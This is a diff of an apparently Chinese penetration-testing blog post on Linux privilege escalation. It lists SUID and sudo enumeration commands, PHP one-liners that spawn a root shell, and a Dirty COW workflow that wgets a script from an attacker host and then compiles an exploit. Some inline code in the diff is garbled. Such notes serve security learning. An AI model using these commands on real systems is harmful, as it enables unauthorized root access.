@@ -49,7 +49,7 @@
         content="2021-12-01">
       <meta 
         property="og:article:modified_time" 
-        content="2022-04-18">
+        content="2022-05-16">
       <meta 
         property="og:article:author" 
         content="CBear">
@@ -325,7 +325,7 @@
     
     
       <span class="dot"></span>
-      <span>1k words</span>
+      <span>973 words</span>
     
   </div>
   
@@ -353,29 +353,34 @@
     id="section" 
     class="post-content">
     <h2 id="u63D0_u6743_u9014_u5F84"><a href="#u63D0_u6743_u9014_u5F84" class="headerlink" title="提权途径"></a>提权途径</h2><blockquote>
-<h3 id="1-_sudo"><a href="#1-_sudo" class="headerlink" title="1. sudo"></a>1. sudo</h3><pre class="line-numbers language-none"><code class="language-none">sudo -l &#x2F;&#x2F;查询具有sudo权限命令<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="1-_sudo"><a href="#1-_sudo" class="headerlink" title="1. sudo"></a>1. sudo</h3><ul>
+<li>能够以root权限执行的命令  </li>
+</ul>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> -l //查询当前用户具有sudo权限命令<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 </blockquote>
 <blockquote>
 <h3 id="2-_suid"><a href="#2-_suid" class="headerlink" title="2. suid"></a>2. suid</h3><ul>
-<li>SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。<br>如果某些现有的二进制文件和实用程序具有SUID权限的话，就可以在执行时将权限提升为root。<br>其中，大家熟知的具有提权功能的Linux可执行文件包括：</li>
+<li>SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。<br>如果某些现有的二进制文件和实用程序具有SUID权限的话，就可以在执行时将权限提升为root。</li>
 </ul>
-<pre class="line-numbers language-none"><code class="language-none">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null &#x2F;&#x2F;查询具有suid执行权限程序<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>可利用的程序：<code>nmap、vim、find、bash、more、less、nano、cp、wget、python、mawk</code>  </p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / -perm -u<span class="token operator">=</span>s -type f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null //查询具有suid执行权限程序
+<span class="token function">find</span> / -user root -perm -4000 -print <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
+<span class="token function">find</span> / -user root -perm -4000 -exec <span class="token function">ls</span> -ldb <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>可利用的程序：<code>nmap、vim/vi、find、bash、more、less、nano、cp、wget、python、mawk</code>  </p>
 </blockquote>
 <blockquote>
-<h3 id="3-__u901A_u8FC7_u5728/etc/passwd_u6DFB_u52A0_u4E00_u4E2Aroot_u6743_u9650_u8D26_u6237"><a href="#3-__u901A_u8FC7_u5728/etc/passwd_u6DFB_u52A0_u4E00_u4E2Aroot_u6743_u9650_u8D26_u6237" class="headerlink" title="3. 通过在/etc/passwd添加一个root权限账户"></a>3. 通过在/etc/passwd添加一个root权限账户</h3><pre class="line-numbers language-none"><code class="language-none">find &#x2F; -writable -type f 2&gt;&#x2F;dev&#x2F;null &#x2F;&#x2F;查询可写权限的文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="3-__u901A_u8FC7_u5728/etc/passwd_u6DFB_u52A0_u4E00_u4E2Aroot_u6743_u9650_u8D26_u6237"><a href="#3-__u901A_u8FC7_u5728/etc/passwd_u6DFB_u52A0_u4E00_u4E2Aroot_u6743_u9650_u8D26_u6237" class="headerlink" title="3. 通过在/etc/passwd添加一个root权限账户"></a>3. 通过在/etc/passwd添加一个root权限账户</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / -writable -type f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null //查询可写权限的文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 </blockquote>
 <blockquote>
-<h3 id="4-__u67E5_u770B/etc/cron*_u4E0B_u6240_u542B_u7684_u6240_u6709_u6587_u4EF6"><a href="#4-__u67E5_u770B/etc/cron*_u4E0B_u6240_u542B_u7684_u6240_u6709_u6587_u4EF6" class="headerlink" title="4. 查看/etc/cron*下所含的所有文件"></a>4. 查看/etc/cron*下所含的所有文件</h3><pre class="line-numbers language-none"><code class="language-none">ls -la &#x2F;etc&#x2F;cron* &#x2F;&#x2F;cron*是用来让使用者在固定时间或固定时间间隔执行程序之用(类似使用者的时程表),攻击者可根据root执行的程序寻找exp。
-cat &#x2F;etc&#x2F;crontab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h3 id="4-__u67E5_u770B/etc/cron*_u4E0B_u6240_u542B_u7684_u6240_u6709_u6587_u4EF6"><a href="#4-__u67E5_u770B/etc/cron*_u4E0B_u6240_u542B_u7684_u6240_u6709_u6587_u4EF6" class="headerlink" title="4. 查看/etc/cron*下所含的所有文件"></a>4. 查看/etc/cron*下所含的所有文件</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> -la /etc/cron* //cron*是用来让使用者在固定时间或固定时间间隔执行程序之用<span class="token punctuation">(</span>类似使用者的时程表<span class="token punctuation">)</span>,攻击者可根据root执行的程序寻找exp。
+<span class="token function">cat</span> /etc/crontab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 </blockquote>
 <h2 id="u63D0_u6743"><a href="#u63D0_u6743" class="headerlink" title="提权"></a>提权</h2><blockquote>
 <h3 id="1-_php"><a href="#1-_php" class="headerlink" title="1. php"></a>1. php</h3><ul>
-<li>sudo<pre class="line-numbers language-none"><code class="language-none">CMD&#x3D;&quot;&#x2F;bin&#x2F;sh&quot;
-sudo php -r &quot;system(&#39;$CMD&#39;);&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
-<li>suid<pre class="line-numbers language-none"><code class="language-none">sudo sh -c &#39;cp $(which php) .; chmod +s .&#x2F;php&#39;
-CMD&#x3D;&quot;&#x2F;bin&#x2F;sh&quot;
-.&#x2F;php -r &quot;pcntl_exec(&#39;&#x2F;bin&#x2F;sh&#39;,[&#39;-p&#39;]);&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<li>sudo<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">CMD</span><span class="token operator">=</span><span class="token string">"/bin/sh"</span>
+<span class="token function">sudo</span> php -r <span class="token string">"system('<span class="token variable">$CMD</span>');"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
+<li>suid<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">sh</span> -c <span class="token string">'cp $(which php) .; chmod +s ./php'</span>
+<span class="token assign-left variable">CMD</span><span class="token operator">=</span><span class="token string">"/bin/sh"</span>
+./php -r <span class="token string">"pcntl_exec('/bin/sh',['-p']);"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 </li>
 </ul>
 </blockquote>
@@ -407,7 +412,7 @@ CMD&#x3D;&quot;&#x2F;bin&#x2F;sh&quot;
 <li><p>攻击机开启<strong>apache</strong>，把需要传输的文件放到 <strong>/var/www/html</strong>。靶机要在 <strong>/tmp</strong>才有 <strong>wget</strong>权限!!!。<br><code>wget http://192.168.117.129/dirtycowscan.sh</code>   </p>
 </li>
 </ul>
-<p>靶机运行脏牛漏洞扫描脚本<code>./dirtycowscan.sh</code>，查看返回结果是否<strong>IS vulnerable</strong>。<br>查看靶机的编译环境<code>gcc -v</code>、<code>g++ -v</code>……；在攻击机找exp<code>searchsploit dirty</code>，找到对应合适的脚本，同样用<strong>scp</strong>或<strong>wget</strong>将 <strong>/usr/share/exploits/&lt;脚本所在path&gt;</strong> 传到靶机上。<br>在靶机上编译运行脚本：  </p>
+<p>靶机运行脏牛漏洞扫描脚本<code>./dirtycowscan.sh</code>，查看返回结果是否<strong>IS vulnerable</strong>。<br>查看靶机的编译环境<code>gcc -v``</code>、<code>g++ -v`……；在攻击机找exp</code>searchsploit dirty<code>`</code>，找到对应合适的脚本，同样用<strong>scp</strong>或<strong>wget</strong>将 <strong>/usr/share/exploits/&lt;脚本所在path&gt;</strong> 传到靶机上。<br>在靶机上编译运行脚本：  </p>
 <blockquote>
 <p>编译源代码：<code>cat &lt;上传的脚本&gt; | grep g++</code>–找到编译语句，如<code>g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil</code>进行编译。<br>运行编译成的文件：如<code>./dcow</code>。  </p>
 </blockquote>
@@ -510,7 +515,7 @@ CMD&#x3D;&quot;&#x2F;bin&#x2F;sh&quot;
   <a 
     class="author-posts-count" 
     href="/archives">
-    <span>36</span>
+    <span>37</span>
     <span>Posts</span>
   </a>
   <a 
@@ -522,7 +527,7 @@ CMD&#x3D;&quot;&#x2F;bin&#x2F;sh&quot;
   <a 
     class="author-tags-count" 
     href="/tags">
-    <span>45</span>
+    <span>46</span>
     <span>Tags</span>
   </a>
 </div>
@@ -573,7 +578,7 @@ CMD&#x3D;&quot;&#x2F;bin&#x2F;sh&quot;
       <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
         <div class="categories-list-item">
           渗透测试
-          <span class="categories-list-item-badge">30</span>
+          <span class="categories-list-item-badge">31</span>
         </div>
       </a>
     
@@ -686,6 +691,12 @@ CMD&#x3D;&quot;&#x2F;bin&#x2F;sh&quot;
       </a>
     
       <a 
+        href="/tags/Nacos/" 
+        title="Nacos">
+        <div class="tags-list-item">Nacos</div>
+      </a>
+    
+      <a 
         href="/tags/SQL%E6%B3%A8%E5%85%A5/" 
         title="SQL注入">
         <div class="tags-list-item">SQL注入</div>
@@ -707,12 +718,6 @@ CMD&#x3D;&quot;&#x2F;bin&#x2F;sh&quot;
         href="/tags/XXE/" 
         title="XXE">
         <div class="tags-list-item">XXE</div>
-      </a>
-    
-      <a 
-        href="/tags/Zabbix/" 
-        title="Zabbix">
-        <div class="tags-list-item">Zabbix</div>
       </a>
     
   </div>
@@ -748,6 +753,11 @@ CMD&#x3D;&quot;&#x2F;bin&#x2F;sh&quot;
   <div class="recent-posts-list">
     
       <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2022-05-07</div>
+        <a href="/36be6aa4.html"><div class="recent-posts-item-content">Vulhub|Nacos集合</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
         <div class="recent-posts-item-title">2022-04-20</div>
         <a href="/d0179d0c.html"><div class="recent-posts-item-content">Vulnhub|DarkHole2</div></a>
       </div>
@@ -760,11 +770,6 @@ CMD&#x3D;&quot;&#x2F;bin&#x2F;sh&quot;
       <div class="recent-posts-item">
         <div class="recent-posts-item-title">2022-03-23</div>
         <a href="/7293a273.html"><div class="recent-posts-item-content">Vulhub|Zabbix集合</div></a>
-      </div>
-    
-      <div class="recent-posts-item">
-        <div class="recent-posts-item-title">2022-03-14</div>
-        <a href="/44cd77ef.html"><div class="recent-posts-item-content">Vulhub|PostgreSQL集合</div></a>
       </div>
     
   </div>
